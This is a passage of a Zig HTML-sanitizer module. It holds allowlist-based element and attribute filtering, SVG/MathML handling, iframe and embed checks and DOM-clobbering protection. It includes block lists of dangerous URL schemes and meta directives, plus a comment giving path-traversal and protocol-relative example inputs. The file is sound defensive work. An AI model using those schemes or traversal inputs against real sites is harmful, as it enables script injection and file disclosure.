//! This module handles the sanitization of HTML content. It is built to ensure that the HTML is safe and clean before it is serialized.
//! It works with _whitelists_ on accepted elements and attributes.
//!
//! It provides functions to
//! - remove unwanted elements, comments
//! - validate and sanitize attributes
//! - ensure safe URI usage
const std = @import("std");
const z = @import("../root.zig");
const css = @import("sanitizer_css.zig");
const HtmlTag = z.HtmlTag;
const Err = z.Err;
const print = std.debug.print;

const testing = std.testing;

pub const CssSanitizer = css.CssSanitizer;
pub const CssSanitizerOptions = css.CssSanitizerOptions;

/// [sanitize] Check if element is a custom element (Web Components spec)
pub fn isCustomElement(tag_name: []const u8) bool {
    // Web Components spec: custom elements must contain a hyphen
    return std.mem.indexOf(u8, tag_name, "-") != null;
}

/// [sanitize] Check if iframe is safe (has sandbox attribute)
fn isIframeSafe(element: *z.HTMLElement) bool {
    // iframe is only safe if it has the sandbox attribute
    if (!z.hasAttribute(element, "sandbox")) return false;

    // Sandbox should NOT allow scripts
    if (z.getAttribute_zc(element, "sandbox")) |v| {
        if (std.mem.indexOf(u8, v, "allow-scripts") != null) {
            return false;
        }
    }

    // Additional validation: check src for dangerous protocols
    if (z.getAttribute_zc(element, "src")) |src_value| {
        if (!z.validateUri(src_value)) return false;
    }

    // Validate srcdoc if present
    if (z.getAttribute_zc(element, "srcdoc")) |_| {
        // Should sanitize srcdoc content!
        return false; // Conservative: block srcdoc entirely
    }

    return true; // Has sandbox and safe src
}

/// [sanitize] Check if attribute is a framework directive or custom attribute
pub fn isFrameworkAttribute(attr_name: []const u8) bool {
    // Use the centralized framework specification from html_spec.zig
    return z.isFrameworkAttribute(attr_name);
}

fn isDescendantOfSvg(tag: z.HtmlTag, parent: z.HtmlTag) bool {
    return tag == .svg or parent == .svg;
}

fn isDescendantOfMathML(tag: z.HtmlTag, parent: z.HtmlTag) bool {
    return tag == .math or parent == .math;
}

/// Check if an SVG element is dangerous using the centralized spec
/// Uses allowlist approach: if not in SVG_ALLOWED_ELEMENTS, it's blocked
fn isDangerousSvgDescendant(tag_name: []const u8) bool {
    // First check explicit dangerous list (fast path for known threats)
    if (z.isSvgElementDangerous(tag_name)) {
        return true;
    }
    // Allowlist approach: if not in allowed list, consider dangerous
    return !z.isSvgElementAllowed(tag_name);
}

/// Check if a MathML element is dangerous or not in the safe list
fn isDangerousMathMLDescendant(tag_name: []const u8) bool {
    // First check explicit dangerous list
    if (z.isMathMLElementDangerous(tag_name)) {
        return true;
    }
    // Allowlist approach: if not in safe list, consider dangerous
    return !z.isMathMLElementSafe(tag_name);
}

/// Check if ancestor_node is an ancestor of node (walks up the DOM tree)
fn isAncestorOf(ancestor_node: *z.DomNode, node: *z.DomNode) bool {
    var current = z.parentNode(node);
    var depth: usize = 0;
    while (current) |parent| : (depth += 1) {
        if (parent == ancestor_node) return true;
        if (depth > 50) return false; // Safety limit
        current = z.parentNode(parent);
    }
    return false;
}

/// Fast O(1) check: is immediate parent the special context node?
inline fn isDirectChildOfSpecialContext(special_node: *z.DomNode, node: *z.DomNode) bool {
    return z.parentNode(node) == special_node;
}

/// Reset context when exiting a special context subtree.
/// O(1) for direct children and known SVG/MathML elements.
/// O(depth) only for HTML/custom elements at context boundary.
fn maybeResetContext(context: *SanitizeContext, node: *z.DomNode) void {
    const special_node = context.special_context_node orelse return;

    // Fast path: direct child of special context (O(1))
    if (isDirectChildOfSpecialContext(special_node, node)) return;

    // For SVG context, skip ancestry check for known SVG elements
    // Known SVG elements (circle, rect, path, g, defs, etc.) can only exist inside SVG
    if (context.parent == .svg) {
        if (z.nodeToElement(node)) |elem| {
            const tag = z.tagFromAnyElement(elem);
            if (tag == .custom) {
                // Use hash lookup to check if it's a known SVG element (O(1))
                const tag_name = z.qualifiedName_zc(elem);
                if (z.isSvgElementAllowed(tag_name) or z.isSvgElementDangerous(tag_name)) {
                    // Known SVG element - definitely inside SVG, skip ancestry walk
                    return;
                }
                // Unknown element (web component, etc.) - need to verify ancestry
            }
        }
    }

    // For MathML context, skip ancestry check for known MathML elements
    if (context.parent == .math) {
        if (z.nodeToElement(node)) |elem| {
            const tag = z.tagFromAnyElement(elem);
            if (tag == .custom) {
                // Use hash lookup to check if it's a known MathML element (O(1))
                const tag_name = z.qualifiedName_zc(elem);
                if (z.isMathMLElementSafe(tag_name) or z.isMathMLElementDangerous(tag_name)) {
                    // Known MathML element - definitely inside MathML, skip ancestry walk
                    return;
                }
            }
        }
    }

    // Slow path: full ancestry check for HTML elements at context boundary (O(depth))
    // This catches when we exit SVG/MathML and encounter siblings like <p> or <my-component>
    if (!isAncestorOf(special_node, node)) {
        context.parent = .body;
        context.special_context_node = null;
    }
}

/// Set special context when entering svg/math/code/pre/template elements
fn setSpecialContext(context: *SanitizeContext, tag: z.HtmlTag, node: *z.DomNode) void {
    if (tag == .svg or tag == .math or tag == .code or tag == .pre or tag == .template) {
        context.parent = tag;
        context.special_context_node = node;
    }
}

/// Sets the parent context for a given tag
fn setAncestor(tag: z.HtmlTag, parent: z.HtmlTag) z.HtmlTag {
    return switch (tag) {
        .svg => .svg,
        .code => .code,
        .pre => .pre,
        .template => .template,
        else => parent, // Context resets are handled by maybeResetContext
    };
}

pub const SanitizerMode = union(enum) {
    none: void,
    minimum: void,
    strict: void,
    permissive: void,
    custom: SanitizerOptions,

    pub inline fn get(self: @This()) SanitizerOptions {
        return switch (self) {
            .none => unreachable, // Should never reach here - early exit in sanitizeWithMode
            .minimum => SanitizerOptions{
                .skip_comments = false,
                .remove_scripts = false,
                .remove_styles = false,
                .strict_uri_validation = false,
                .allow_custom_elements = true,
                .allow_framework_attrs = true,
                .sanitize_dom_clobbering = false,
            },
            .strict => SanitizerOptions{
                .skip_comments = true,
                .remove_scripts = true,
                .remove_styles = true,
                .strict_uri_validation = true,
                .allow_custom_elements = false,
                .allow_framework_attrs = false,
                .sanitize_dom_clobbering = true,
            },
            .permissive => SanitizerOptions{
                .skip_comments = true,
                .remove_scripts = true,
                .remove_styles = true,
                .strict_uri_validation = false,
                .allow_custom_elements = true,
                .allow_framework_attrs = true,
                .sanitize_dom_clobbering = true,
            },
            .custom => |opts| opts,
        };
    }
};

/// [sanitize] Settings of the sanitizer
///
/// The `.minimum` option does:
/// 1. Dangerous URL schemes: javascript:,
///  vbscript: in ANY attribute value
///  2. Dangerous data URLs: data:text/html,
///  data:text/javascript, data: with base64
///  3. Event handlers: All on* attributes
///  (onclick, onerror, etc.)
///  4. Invalid targets: Non-standard target
///  attribute values
///  5. Inline styles: style attributes (removes
///  CSS injection)
///  6. Dangerous SVG elements: script,
///  foreignObject, animate, etc. in SVG context
///  7. Unsafe iframes: iframes without sandbox
///  attribute
pub const SanitizerOptions = struct {
    skip_comments: bool = true,
    remove_scripts: bool = true,
    remove_styles: bool = true,
    strict_uri_validation: bool = true,
    allow_custom_elements: bool = false,
    allow_framework_attrs: bool = false,
    allow_embeds: bool = false,
    /// Remove id/name attributes that shadow DOM properties (e.g., id="location")
    /// Prevents DOM Clobbering attacks. Enabled by default like DOMPurify's SANITIZE_DOM.
    sanitize_dom_clobbering: bool = true,
    /// When styles are allowed (remove_styles=false), sanitize inline style attribute values
    /// using the CSS sanitizer to remove dangerous CSS like expressions, url(), etc.
    sanitize_inline_styles: bool = true,
};

const AttributeAction = struct {
    element: *z.HTMLElement,
    attr_name: []const u8, // arena-owned copy for deferred removal
};

const AttributeUpdateAction = struct {
    element: *z.HTMLElement,
    attr_name: []const u8, // arena-owned copy
    new_value: []const u8, // arena-owned sanitized value
};

// Context for simple_walk sanitization callback
// All temporary allocations use the arena for single bulk deallocation
const SanitizeContext = struct {
    arena: std.heap.ArenaAllocator,
    options: SanitizerOptions,
    parent: z.HtmlTag = .html,
    /// The DOM node where special context (svg/code/pre/template) was set.
    /// Used to efficiently reset context when exiting that subtree.
    special_context_node: ?*z.DomNode = null,
    /// Optional CSS sanitizer for inline style sanitization (externally owned)
    css_sanitizer: ?*css.CssSanitizer = null,

    // Dynamic storage - all use arena allocator
    nodes_to_remove: std.ArrayListUnmanaged(*z.DomNode),
    attributes_to_remove: std.ArrayListUnmanaged(AttributeAction),
    attributes_to_update: std.ArrayListUnmanaged(AttributeUpdateAction),
    template_nodes: std.ArrayListUnmanaged(*z.DomNode),

    fn init(backing_allocator: std.mem.Allocator, opts: SanitizerOptions) @This() {
        return @This(){
            .arena = std.heap.ArenaAllocator.init(backing_allocator),
            .options = opts,
            .nodes_to_remove = .empty,
            .attributes_to_remove = .empty,
            .attributes_to_update = .empty,
            .template_nodes = .empty,
        };
    }

    fn initWithCss(backing_allocator: std.mem.Allocator, opts: SanitizerOptions, css_san: ?*css.CssSanitizer) @This() {
        var ctx = init(backing_allocator, opts);
        ctx.css_sanitizer = css_san;
        return ctx;
    }

    /// Single bulk deallocation - arena handles everything
    fn deinit(self: *@This()) void {
        self.arena.deinit();
    }

    /// Get arena allocator for all temporary allocations
    inline fn alloc(self: *@This()) std.mem.Allocator {
        return self.arena.allocator();
    }

    fn addNodeToRemove(self: *@This(), node: *z.DomNode) !void {
        try self.nodes_to_remove.append(self.alloc(), node);
    }

    fn addAttributeToRemove(self: *@This(), element: *z.HTMLElement, attr_name: []const u8) !void {
        const owned_name = try self.alloc().dupe(u8, attr_name);
        try self.attributes_to_remove.append(self.alloc(), AttributeAction{
            .element = element,
            .attr_name = owned_name,
        });
    }

    fn addAttributeToUpdate(self: *@This(), element: *z.HTMLElement, attr_name: []const u8, new_value: []const u8) !void {
        const owned_name = try self.alloc().dupe(u8, attr_name);
        const owned_value = try self.alloc().dupe(u8, new_value);
        try self.attributes_to_update.append(self.alloc(), AttributeUpdateAction{
            .element = element,
            .attr_name = owned_name,
            .new_value = owned_value,
        });
    }

    fn addTemplate(self: *@This(), template_node: *z.DomNode) !void {
        try self.template_nodes.append(self.alloc(), template_node);
    }
};

// Helper function to remove node and continue
inline fn removeAndContinue(context_ptr: *SanitizeContext, node: *z.DomNode) c_int {
    context_ptr.addNodeToRemove(node) catch return z._STOP;
    return z._CONTINUE;
}

// Handle SVG elements (both known and unknown)
fn handleSvgElement(context_ptr: *SanitizeContext, node: *z.DomNode, element: *z.HTMLElement, tag_name: []const u8) c_int {
    // Check if it's a dangerous SVG element
    if (isDangerousSvgDescendant(tag_name)) {
        return removeAndContinue(context_ptr, node);
    }

    // Check if it's in the SVG allowlist
    if (z.isSvgElementAllowed(tag_name)) {
        // For SVG elements, we need to filter dangerous attributes
        // Use a generic attribute filtering since most SVG elements don't have HtmlTag enums
        filterSvgAttributes(context_ptr, element) catch return z._STOP;
        return z._CONTINUE;
    }

    // Not in allowlist - remove unknown SVG element
    return removeAndContinue(context_ptr, node);
}

// Handle MathML elements (both known and unknown)
fn handleMathMLElement(context_ptr: *SanitizeContext, node: *z.DomNode, element: *z.HTMLElement, tag_name: []const u8) c_int {
    // Check if it's a dangerous MathML element
    if (isDangerousMathMLDescendant(tag_name)) {
        // For now, just remove dangerous MathML elements
        // TODO: unwrap to preserve text content
        return removeAndContinue(context_ptr, node);
    }

    // Safe MathML element - filter attributes
    // Remove dangerous attributes (href, xlink:href, etc.) and keep only safe ones
    filterMathMLAttributes(context_ptr, element) catch return z._STOP;

    return z._CONTINUE;
}

fn filterSvgAttributes(context: *SanitizeContext, element: *z.HTMLElement) !void {
    var iter = z.iterateAttributes(element);

    while (iter.next()) |attr_pair| {
        var should_remove = false;

        // Global blocklist (onclick, onload, etc.) - O(1) lookup
        if (z.DANGEROUS_ATTRIBUTES.has(attr_pair.name)) {
            should_remove = true;
        }

        // Validate href and xlink:href with strict SVG URI rules
        if (!should_remove and z.isSvgUrlAttribute(attr_pair.name)) {
            // SVG URIs must be fragment-only (#id) for security
            if (!z.validateSvgUri(attr_pair.value)) {
                should_remove = true;
            }
        }

        if (should_remove) {
            try context.addAttributeToRemove(element, attr_pair.name);
        }
    }
}

fn filterMathMLAttributes(context: *SanitizeContext, element: *z.HTMLElement) !void {
    var iter = z.iterateAttributes(element);

    while (iter.next()) |attr_pair| {
        var should_remove = false;

        // Global blocklist (href, xlink:href, onclick, etc.) - O(1) lookup
        if (z.DANGEROUS_ATTRIBUTES.has(attr_pair.name)) {
            should_remove = true;
        }

        // Check if attribute is in MathML safe list
        if (!should_remove and !z.isMathMLAttributeSafe(attr_pair.name)) {
            should_remove = true;
        }

        // Validate color values for mathcolor/mathbackground
        if (!should_remove and z.isMathMLColorAttribute(attr_pair.name)) {
            // Validate color values (no javascript:, data:, etc.)
            if (!z.validateUri(attr_pair.value)) {
                should_remove = true;
            }
        }

        if (should_remove) {
            try context.addAttributeToRemove(element, attr_pair.name);
        }
    }
}

/// Handle element nodes with separate treatment for templates as we need to access their content.
fn handleElement(context: *SanitizeContext, node: *z.DomNode) c_int {
    maybeResetContext(context, node);
    const element = z.nodeToElement(node) orelse return z._CONTINUE;

    // 1. Handle templates (Logic split: Context switch + Attribute scan)
    if (z.isTemplate(node)) {
        return handleTemplateElement(context, node);
    }

    const tag = z.tagFromAnyElement(element);

    if (tag != .custom) {
        return handleKnownElementWithContent(context, node, element, tag);
    }

    return handleUnknownElementWithContent(context, node, element);
}

fn handleTemplateElement(context: *SanitizeContext, node: *z.DomNode) c_int {
    context.parent = .template;
    context.addTemplate(node) catch return z._STOP;

    // FIX: Process the <template> tag's own attributes (e.g. id="...", class="...")
    if (z.nodeToElement(node)) |element| {
        collectDangerousAttributesEnum(context, element, .template) catch return z._STOP;
    }

    return z._CONTINUE;
}

fn handleStyleElement(context: *SanitizeContext, node: *z.DomNode) !c_int {
    // Get the CSS sanitizer
    const css_san = context.css_sanitizer orelse return z._CONTINUE;

    // Get the element from the node
    const element = z.nodeToElement(node) orelse return z._CONTINUE;

    // Get the text content of the <style> element
    const original_css = z.textContent_zc(node);

    // If empty, just validate attributes and continue
    if (original_css.len == 0) {
        try collectDangerousAttributesEnum(context, element, .style);
        return z._CONTINUE;
    }

    // Sanitize the stylesheet content
    const sanitized_css = css_san.sanitizeStylesheet(original_css) catch |err| {
        // On sanitization error, remove the style element
        std.debug.print("CSS sanitization error: {any}\n", .{err});
        try context.addNodeToRemove(node);
        return z._CONTINUE;
    };
    // IMPORTANT: CSS sanitizer uses its own allocator - must free with that allocator
    defer css_san.allocator.free(sanitized_css);

    // If sanitized CSS is empty, remove the entire <style> element
    const trimmed = std.mem.trim(u8, sanitized_css, &std.ascii.whitespace);
    if (trimmed.len == 0) {
        try context.addNodeToRemove(node);
        return z._CONTINUE;
    }

    // Replace the content with sanitized CSS
    // Only update if the content changed
    if (!std.mem.eql(u8, sanitized_css, original_css)) {
        z.setContentAsText(node, sanitized_css) catch {
            // On error, remove the element (sanitized_css freed by defer)
            try context.addNodeToRemove(node);
            return z._CONTINUE;
        };
    }

    // Validate the <style> element's attributes (e.g., type, media, nonce)
    try collectDangerousAttributesEnum(context, element, .style);

    return z._CONTINUE;
}

fn handleKnownElementWithContent(context: *SanitizeContext, node: *z.DomNode, element: *z.HTMLElement, tag: z.HtmlTag) c_int {

    // 1. Handle <style> elements: sanitize if css_sanitizer is available and remove_styles = false
    if (tag == .style) {
        if (context.options.remove_styles) {
            // User wants to remove all styles
            return removeAndContinue(context, node);
        } else if (context.css_sanitizer != null) {
            // Sanitize the stylesheet content
            return handleStyleElement(context, node) catch z._STOP;
        }
        // If no CSS sanitizer, fall through to normal attribute validation
    }

    // 2. Check Global Blocklist (for other tags)
    if (shouldRemoveTag(context.options, tag)) {
        return removeAndContinue(context, node);
    }

    // 3. Proactive Security Checks (Element-specific Logic)
    // These checks run BEFORE we validate attributes or descend into children.
    switch (tag) {
        .meta => if (!validateMetaElement(context, element)) return removeAndContinue(context, node),
        .base => if (!validateBaseElement(context, element)) return removeAndContinue(context, node),
        .object, .embed => if (!validateEmbeddedElement(context, element, tag)) return removeAndContinue(context, node),
        .iframe => if (!isIframeSafe(element)) return removeAndContinue(context, node),
        else => {},
    }

    // 3. Set Special Context (for svg/math/code/pre/template)
    setSpecialContext(context, tag, node);

    // 4. Handle SVG Context
    if (isDescendantOfSvg(tag, context.parent)) {
        context.parent = .svg;
        // Only set special_context_node when entering a NEW svg context, not for children
        if (tag == .svg) {
            context.special_context_node = node;
        }
        return handleSvgElement(context, node, element, @tagName(tag));
    }

    // 5. Handle MathML Context
    if (isDescendantOfMathML(tag, context.parent)) {
        context.parent = .math;
        // Only set special_context_node when entering a NEW math context, not for children
        if (tag == .math) {
            context.special_context_node = node;
        }
        return handleMathMLElement(context, node, element, @tagName(tag));
    }

    // 6. Validate Attributes (Using the Zero-Alloc Iterator)
    collectDangerousAttributesEnum(context, element, tag) catch return z._STOP;

    return z._CONTINUE;
}

fn handleUnknownElementWithContent(context: *SanitizeContext, node: *z.DomNode, element: *z.HTMLElement) c_int {
    const tag_name = z.qualifiedName_zc(element);

    if (context.parent == .svg) {
        return handleSvgElement(context, node, element, tag_name);
    }

    if (context.parent == .math) {
        return handleMathMLElement(context, node, element, tag_name);
    }

    if (context.options.allow_custom_elements and isCustomElement(tag_name)) {
        // Use the .custom spec for unknown custom elements
        collectDangerousAttributesEnum(context, element, .custom) catch return z._STOP;
        // Check if it contains templates
        var child = z.firstChild(node);
        while (child) |c| {
            const next = z.nextSibling(c);
            if (z.isTemplate(c)) {
                context.addTemplate(c) catch return z._STOP;
            }
            child = next;
        }
    } else {
        return removeAndContinue(context, node);
    }

    return z._CONTINUE;
}

fn validateBaseElement(context: *SanitizeContext, element: *z.HTMLElement) bool {
    // Base tags are extremely dangerous - consider removing them entirely
    // in strict mode
    if (context.options.strict_uri_validation) {
        return false; // Remove all base tags in strict mode
    }

    if (z.getAttribute_zc(element, "href")) |href| {
        if (!z.validateUri(href)) return false;

        // Block javascript: and data: protocols
        if (std.ascii.indexOfIgnoreCase(href, "javascript:") != null) return false;
        if (std.ascii.indexOfIgnoreCase(href, "data:") != null) return false;
        if (std.ascii.indexOfIgnoreCase(href, "vbscript:") != null) return false;

        // Block file: protocol
        if (std.ascii.indexOfIgnoreCase(href, "file:") != null) return false;

        // Block relative URLs that could be manipulated
        // (e.g., "../../../etc/passwd" or "//evil.com")
        if (std.mem.startsWith(u8, href, "//")) return false;
        if (std.mem.indexOf(u8, href, "../") != null) return false;
        if (std.mem.indexOf(u8, href, "..\\") != null) return false;

        // Only allow http, https, or root-relative URLs
        const is_http = std.mem.startsWith(u8, href, "http://") or
            std.mem.startsWith(u8, href, "https://");
        const is_root_relative = std.mem.startsWith(u8, href, "/") and
            !std.mem.startsWith(u8, href, "//");

        return is_http or is_root_relative;
    }

    return true;
}

fn validateMetaElement(_: *SanitizeContext, element: *z.HTMLElement) bool {
    if (z.getAttribute_zc(element, "http-equiv")) |equiv| {
        const dangerous_equivs = [_][]const u8{
            "refresh",
            "set-cookie",
            "content-security-policy", // Can override page CSP
            "x-ua-compatible", // Can force compatibility modes
            "default-style", // Can change page styling
            "content-type", // Can override charset
        };

        for (dangerous_equivs) |danger| {
            if (std.ascii.eqlIgnoreCase(equiv, danger)) {
                return false;
            }
        }

        // Special validation for refresh
        if (std.ascii.eqlIgnoreCase(equiv, "refresh")) {
            if (z.getAttribute_zc(element, "content")) |content| {
                return validateMetaRefreshContent(content);
            }
            return false; // Refresh without content is invalid
        }
    }

    // Block charset attacks (except UTF-8)
    if (z.getAttribute_zc(element, "charset")) |charset| {
        if (!std.ascii.eqlIgnoreCase(charset, "utf-8")) {
            return false;
        }
    }

    return true;
}

fn validateMetaRefreshContent(value: []const u8) bool {
    var iter = std.mem.splitScalar(u8, value, ';');

    // First part should be the delay
    if (iter.next()) |delay_str| {
        const trimmed = std.mem.trim(u8, delay_str, &std.ascii.whitespace);
        const delay = std.fmt.parseUnsigned(u32, trimmed, 10) catch return false;

        // Prevent immediate or very fast refreshes (phishing technique)
        if (delay < 3) return false; // Minimum 3 seconds
        if (delay > 3600) return false; // Maximum 1 hour
    } else {
        return false;
    }

    // Check URL if present
    if (iter.next()) |url_part| {
        const trimmed = std.mem.trim(u8, url_part, &std.ascii.whitespace);
        if (std.mem.startsWith(u8, trimmed, "url=")) {
            const url = trimmed[4..];
            if (!z.validateUri(url)) return false;

            // Additional checks for refresh URLs
            if (std.mem.indexOf(u8, url, "javascript:") != null) return false;
            if (std.mem.indexOf(u8, url, "data:") != null) return false;
        }
    }

    return true;
}

/// [sanitize] Validate <object> and <embed> (Flash/Plugins)
fn validateEmbeddedElement(_: *SanitizeContext, element: *z.HTMLElement, tag: z.HtmlTag) bool {
    const url_attr = if (tag == .object) "data" else "src";

    if (z.getAttribute_zc(element, url_attr)) |url| {
        if (!z.validateUri(url)) return false;

        // Block dangerous protocols
        if (containsCaseInsensitive(url, "javascript:")) return false;
        if (containsCaseInsensitive(url, "data:")) return false;
        if (containsCaseInsensitive(url, "vbscript:")) return false;
        if (containsCaseInsensitive(url, "file:")) return false;

        // Only allow specific file types
        const safe_extensions = [_][]const u8{
            //  ".swf", // Consider blocking .swf
            ".pdf",
            ".svg",
            ".png",
            ".jpg",
            ".jpeg",
            ".gif",
            ".webp",
            ".mp4",
            ".webm",
            ".ogg",
            ".mp3",
            ".wav",
            ".flac",
            ".txt",
            ".csv",
            ".json",
            ".xml",
        };

        var has_safe_extension = false;
        for (safe_extensions) |ext| {
            if (std.ascii.endsWithIgnoreCase(url, ext)) {
                has_safe_extension = true;
                break;
            }
        }

        if (!has_safe_extension) {
            if (z.getAttribute_zc(element, "type")) |mime_type|
                return z.isSafeMimeType(mime_type);

            return false;
        }

        // Validate type attribute
        if (z.getAttribute_zc(element, "type")) |mime| {
            return z.isSafeMimeType(mime);
        }
    }
    if (z.getAttribute_zc(element, "type")) |mime| {
        return z.isSafeMimeType(mime);
    }
    return true;
}

/// Sanitization collector callback for simple walk
///
/// The callback will be applied to every descendant of the given node given the current context object used as a collector.
///
/// A second post-processing step may be applied after the DOM traversal is complete and process the collected nodes and attributes.
fn sanitizeCollectorCB(node: *z.DomNode, ctx: ?*anyopaque) callconv(.c) c_int {
    const context_ptr: *SanitizeContext = @ptrCast(@alignCast(ctx));

    switch (z.nodeType(node)) {
        .text => {}, // Text nodes don't need context computation
        .comment => {
            // Comments don't need context - just check if we should remove
            if (context_ptr.options.skip_comments) {
                return removeAndContinue(context_ptr, node);
            }
        },
        .element => return handleElement(context_ptr, node),
        else => {}, // Other node types don't need context
    }

    return z._CONTINUE;
}

inline fn shouldRemoveTag(options: SanitizerOptions, tag: z.HtmlTag) bool {
    return switch (tag) {
        .script => options.remove_scripts,
        .style => options.remove_styles,
        // Remove object/embed when NOT allowed (inverted: allow_embeds=false means remove)
        .object, .embed => !options.allow_embeds,
        else => false,
        // Note: iframe is handled separately with sandbox validation
    };
}

// Helper
fn containsCaseInsensitive(haystack: []const u8, needle: []const u8) bool {
    return std.ascii.indexOfIgnoreCase(haystack, needle) != null;
}

fn collectDangerousAttributesEnum(context: *SanitizeContext, element: *z.HTMLElement, tag: HtmlTag) !void {
    var iter = z.iterateAttributes(element);
    // std.debug.print("\nChecking attributes for element: {s}\t", .{@tagName(tag)});

    while (iter.next()) |attr_pair| {
        var should_remove = false;

        // FAIL FAST: Dangerous attributes check (includes blocklist + all on* handlers)
        if (z.isDangerousAttribute(attr_pair.name)) {
            should_remove = true;
        }

        // mXSS Protection: Check attribute values for mutation attack patterns
        // These patterns can cause content to mutate during parse/serialize cycles
        if (!should_remove and z.containsMxssPattern(attr_pair.value)) {
            should_remove = true;
        }

        // Runtime Configuration Checks (Logic that cannot be in static specs)
        if (!should_remove and std.mem.eql(u8, attr_pair.name, "style")) {
            if (context.options.remove_styles) {
                should_remove = true;
            } else if (context.options.sanitize_inline_styles) {
                // Styles are allowed but need sanitization
                if (context.css_sanitizer) |css_san| {
                    // Use CSS sanitizer to clean the style value
                    const sanitized = css_san.sanitizeStyleString(attr_pair.value) catch {
                        // On sanitization error, remove the style attribute
                        should_remove = true;
                        continue;
                    };
                    // IMPORTANT: CSS sanitizer uses its own allocator - must free with that allocator
                    defer css_san.allocator.free(sanitized);

                    // If sanitized is different from original, queue an update
                    if (!std.mem.eql(u8, sanitized, attr_pair.value)) {
                        if (sanitized.len == 0) {
                            // Empty result means remove the attribute
                            should_remove = true;
                        } else {
                            // Queue attribute update with sanitized value (addAttributeToUpdate makes a copy)
                            try context.addAttributeToUpdate(element, attr_pair.name, sanitized);
                            // Don't remove - we're updating instead
                            continue;
                        }
                    }
                    // If same, fall through to spec validation
                }
                // If no CSS sanitizer, fall through to the Spec check below
                // which will call z.validateStyle() automatically.
            }
        }

        // DOM Clobbering Protection: remove id/name that shadow DOM properties
        if (!should_remove and context.options.sanitize_dom_clobbering) {
            if (z.isDomClobberingAttribute(attr_pair.name)) {
                if (z.isDomClobberingName(attr_pair.value)) {
                    should_remove = true;
                }
            }
        }

        // Framework Attributes
        if (!should_remove and isFrameworkAttribute(attr_pair.name)) {
            if (context.options.allow_framework_attrs) {
                // Check for dangerous patterns in framework attribute values
                for (z.DANGEROUS_JS_PATTERNS) |pattern| {
                    if (containsCaseInsensitive(attr_pair.value, pattern)) {
                        should_remove = true;
                        break;
                    }
                }
                if (!should_remove) continue;
            } else {
                // Framework attributes not allowed in this mode
                should_remove = true;
            }
        }

        // Standard Attributes (The Spec Engine)
        // Uses findAttributeSpecEnum which handles prefix matching (aria-*, data-*, etc.)
        if (!should_remove) {
            if (z.findAttributeSpecEnum(tag, attr_pair.name)) |spec| {
                // A. Enum Validation
                if (spec.valid_values) |valid_vals| {
                    var is_valid_enum = false;
                    for (valid_vals) |val| {
                        if (std.mem.eql(u8, val, attr_pair.value)) {
                            is_valid_enum = true;
                            break;
                        }
                    }
                    if (!is_valid_enum) should_remove = true;
                }

                // B. Validator Function (Handles href, src, style, xlink:href)
                if (!should_remove) {
                    if (spec.validator) |validator| {
                        if (!validator(attr_pair.value)) {
                            should_remove = true;
                        }
                    }
                }
            } else {
                should_remove = true; // Attribute not in allowlist
            }
        }

        // Cross-Attribute Dependency (target="_blank" -> rel="noopener")
        if (!should_remove and std.mem.eql(u8, attr_pair.name, "target") and std.mem.eql(u8, attr_pair.value, "_blank")) {
            var has_safe_rel = false;
            // CHEAP RE-ITERATION (No allocation)
            var rel_iter = z.iterateAttributes(element);
            while (rel_iter.next()) |other| {
                if (std.mem.eql(u8, other.name, "rel")) {
                    if (std.mem.indexOf(u8, other.value, "noopener") != null or
                        std.mem.indexOf(u8, other.value, "noreferrer") != null)
                    {
                        has_safe_rel = true;
                        break;
                    }
                }
            }
            if (!has_safe_rel) should_remove = true;
        }

        if (should_remove) {
            // We MUST duplicate the name here because 'attr_pair.name' is a temporary
            // pointer into Lexbor's memory, but the removal list persists.
            try context.addAttributeToRemove(element, attr_pair.name);
        }
    }
}

fn sanitizePostWalkOperations(allocator: std.mem.Allocator, context: *SanitizeContext, options: SanitizerOptions) (std.mem.Allocator.Error || z.Err)!void {
    return sanitizePostWalkOperationsWithCss(allocator, context, options, null);
}

fn sanitizePostWalkOperationsWithCss(allocator: std.mem.Allocator, context: *SanitizeContext, options: SanitizerOptions, css_sanitizer: ?*css.CssSanitizer) (std.mem.Allocator.Error || z.Err)!void {
    // 1. Remove attributes first (safest operation)
    for (context.attributes_to_remove.items) |action| {
        try z.removeAttribute(action.element, action.attr_name);
    }

    // 1b. Update attributes (for sanitized inline styles)
    for (context.attributes_to_update.items) |action| {
        try z.setAttribute(action.element, action.attr_name, action.new_value);
    }

    // 2. Process templates (recurse into them)
    // We do this before destroying nodes, in case a template is inside a node to be destroyed.
    // (Wasteful but safe from use-after-free).
    for (context.template_nodes.items) |template_node| {
        try sanitizeTemplateContentWithCss(
            allocator,
            template_node,
            options,
            css_sanitizer,
        );
    }

    // 3. Remove nodes in REVERSE order
    // The walker usually discovers parents before children.
    // If we destroy a parent first, the child is destroyed. Accessing the child later would be use-after-free.
    // By popping from the end (children first), we ensure safe destruction.
    while (context.nodes_to_remove.pop()) |node| {
        z.removeNode(node);
        z.destroyNode(node);
    }
}

fn sanitizeTemplateContent(allocator: std.mem.Allocator, template_node: *z.DomNode, options: SanitizerOptions) (std.mem.Allocator.Error || z.Err)!void {
    return sanitizeTemplateContentWithCss(allocator, template_node, options, null);
}

fn sanitizeTemplateContentWithCss(allocator: std.mem.Allocator, template_node: *z.DomNode, options: SanitizerOptions, css_sanitizer: ?*css.CssSanitizer) (std.mem.Allocator.Error || z.Err)!void {
    const template = z.nodeToTemplate(template_node) orelse return;
    const content_node = z.templateContent(template);

    var template_context = SanitizeContext.initWithCss(allocator, options, css_sanitizer);
    defer template_context.deinit();

    z.simpleWalk(
        content_node,
        sanitizeCollectorCB,
        &template_context,
    );

    try sanitizePostWalkOperationsWithCss(allocator, &template_context, options, css_sanitizer);
}

/// [sanitize] Sanitize DOM tree with configurable options
///
/// Main sanitization function that removes dangerous content based on the provided options.
/// Supports .none, .minimum, .strict, .permissive, and .custom sanitization modes.
pub fn sanitizeWithMode(
    allocator: std.mem.Allocator,
    root_node: *z.DomNode,
    mode: SanitizerMode,
) (std.mem.Allocator.Error || z.Err)!void {
    return sanitizeWithCss(allocator, root_node, mode, null);
}

/// [sanitize] Sanitize DOM tree with CSS sanitizer for inline style sanitization
///
/// Main sanitization function with optional CSS sanitizer. When css_sanitizer is provided
/// and options.sanitize_inline_styles is true, inline style attributes will be sanitized
/// rather than removed (if styles are allowed via remove_styles=false).
pub fn sanitizeWithCss(
    allocator: std.mem.Allocator,
    root_node: *z.DomNode,
    mode: SanitizerMode,
    css_sanitizer: ?*css.CssSanitizer,
) (std.mem.Allocator.Error || z.Err)!void {
    // Early exit for .none - do absolutely nothing
    if (mode == .none) return;

    const sanitizer_options = mode.get();
    var context = SanitizeContext.initWithCss(allocator, sanitizer_options, css_sanitizer);
    defer context.deinit();

    z.simpleWalk(
        root_node,
